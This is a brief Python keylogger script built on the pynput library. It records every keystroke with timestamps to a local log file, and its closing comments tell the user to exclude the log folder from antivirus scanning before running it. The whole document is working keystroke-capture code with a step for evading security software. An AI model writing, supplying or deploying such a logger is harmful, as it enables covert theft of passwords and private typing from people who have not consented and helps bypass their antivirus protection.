#install pynput py using pip
#pip3 install pynput

import pynput

from pynput.keyboard import Key, Listener

import logging

log_dir = "E:\keylogger"

logging.basicConfig(filename = (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key): logging.info(str(key))

with Listener(on_press=on_press) as listener:listener.join()

#make this folder exclusive to the antivirus software 
#goto settings > virus&threat protection > add exclusive
#then execute the python script using any python platform.
